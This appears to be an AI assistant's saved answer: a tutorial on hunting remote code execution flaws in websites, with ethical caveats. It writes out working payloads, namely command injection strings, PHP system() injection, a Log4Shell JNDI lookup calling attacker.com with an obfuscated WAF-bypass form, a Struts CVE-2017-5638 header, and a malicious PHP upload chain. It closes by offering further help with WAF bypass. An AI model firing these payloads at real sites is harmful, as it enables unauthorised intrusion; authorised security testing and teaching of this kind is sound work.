# RCE-vulnerabilities
Finding RCE vulnerabilities on websites is a complex and sensitive topic. As an AI, I can explain the general techniques and methodologies that security researchers and ethical hackers (with permission) use to identify such flaws. However, I must emphasize that attempting to find or exploit vulnerabilities on websites without explicit authorization is illegal and unethical—often violating laws like the Computer Fraud and Abuse Act (CFAA) in the U.S. or similar regulations elsewhere. Always get written permission from the website owner before testing, such as through a bug bounty program.

Here’s how professionals approach discovering RCE vulnerabilities responsibly:

---

### 1. **Understand the Target**
- **Reconnaissance**: Start by gathering info about the website—its tech stack (e.g., Apache, Nginx, PHP, Java), frameworks (e.g., WordPress, Django), and dependencies. Tools like Wappalyzer or manual inspection of HTTP headers can reveal this.
- **Scope**: Identify what’s testable (e.g., input fields, APIs, file uploads) where code might be executed.

### 2. **Look for Common Entry Points**
RCE often stems from mishandling user input. Focus on:
- **URL Parameters**: `example.com?page=malicious_code`
- **Form Inputs**: Text fields, search bars, or login forms.
- **File Uploads**: Check if uploaded files (e.g., images, PDFs) are executed rather than just stored.
- **HTTP Headers**: Some apps process headers like `User-Agent` unsafely.
- **APIs**: Test JSON/XML inputs for injection points.

### 3. **Test for Input Validation Flaws**
- **Command Injection**: If the site interacts with a server’s shell, try injecting system commands. For example, appending `; ls` or `&& dir` to an input might reveal if it’s executed (e.g., `ping 127.0.0.1; ls`).
- **Code Injection**: If it’s a PHP site, test for `eval()` or `system()` misuse by injecting `<?php system('id'); ?>` into a parameter.
- **Deserialization**: For Java-based sites, craft payloads (e.g., using ysoserial) to exploit insecure deserialization, like in Apache Struts or Log4j.

### 4. **Exploit Known Vulnerabilities**
- **Outdated Software**: Use tools like `nmap` or `whatweb` to detect versions of web servers, CMSes (e.g., WordPress), or libraries. Cross-reference with CVE databases (e.g., NIST NVD) for known RCE exploits.
- **Specific Exploits**: For example, test for Log4Shell by sending `${jndi:ldap://attacker.com/a}` to a loggable field if Log4j is suspected.

### 5. **Use Automated Tools (With Caution)**
- **Burp Suite**: Capture and manipulate HTTP requests to inject payloads and observe responses.
- **OWASP ZAP**: Scan for vulnerabilities, though it’s less specific to RCE.
- **sqlmap**: While primarily for SQL injection, it can sometimes chain into RCE if the database allows command execution.
- **Custom Scripts**: Write Python scripts with libraries like `requests` to fuzz inputs with RCE payloads (e.g., `; whoami`).

### 6. **Analyze Responses**
- **Direct Output**: If `id` returns `uid=33(www-data)`, you’ve got RCE.
- **Time Delays**: Use `sleep(10)` or `ping -c 10 127.0.0.1` to detect blind execution via timing differences.
- **DNS Requests**: Send a payload like `ping attacker-controlled-domain.com` and check DNS logs to confirm execution.

### 7. **Advanced Techniques**
- **Reverse Engineering**: If you can access server-side code (e.g., via a misconfigured endpoint), look for functions like `exec()`, `eval()`, or `Runtime.getRuntime().exec()` in Java.
- **Chaining Bugs**: Combine lesser flaws (e.g., file upload + local file inclusion) to achieve RCE. Example: Upload a malicious `.php` file, then trigger it via `include()`.

### Real-World Example Workflow
Imagine testing `example.com` (with permission):
1. Discover it runs an old Apache Struts version via HTTP headers.
2. Research CVE-2017-5638 (Struts RCE).
3. Craft a malicious `Content-Type` header: `Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().print("test")}`.
4. Send it with Burp Suite. If "test" appears in the response, it’s vulnerable to RCE.

### Challenges and Tips
- **Obfuscation**: Modern sites use WAFs (e.g., Cloudflare) to block obvious payloads. Encode or split payloads (e.g., `${jndi:${lower:l}${lower:d}a${lower:p}://...}`).
- **False Positives**: A delay might not mean RCE—verify with multiple tests.
- **Ethics**: Report findings to the site owner immediately if part of a legal test.

### Tools Recap
- **Recon**: Wappalyzer, Shodan, `curl`
- **Testing**: Burp Suite, OWASP ZAP, `netcat`
- **Exploitation**: Metasploit (for known CVEs), custom scripts

This is a high-level overview of how pros hunt for RCEs. It requires technical skill, patience, and a legal framework (e.g., bug bounties on HackerOne or Bugcrowd). Want me to expand on a specific technique, like crafting payloads or bypassing WAFs? Just let me know!
